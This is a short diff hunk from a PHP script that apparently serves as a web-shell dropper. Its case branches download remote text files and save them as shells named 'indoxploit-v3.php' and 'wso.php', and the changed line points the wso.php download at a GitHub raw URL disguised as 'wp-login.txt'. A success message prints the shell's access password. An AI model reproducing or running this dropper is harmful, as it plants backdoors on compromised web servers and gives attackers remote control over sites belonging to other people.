@@ -1111,7 +1111,7 @@ case (op('indoxploit-v3.php', 'https://random-php.ftp.sh/idx-v3.txt')):
 case ('6'):
 switch (true)
 	{
-case (op('wso.php', 'https://random-php.ftp.sh/wso.txt')):
+case (op('wso.php', 'https://raw.githubusercontent.com/qrtsir/shell/main/wp-login.txt')):
 	$ok = '<strong>wso.php > </strong>ok! '.alt_ok().'pas: ghost287</div>';
 	}
 	break;
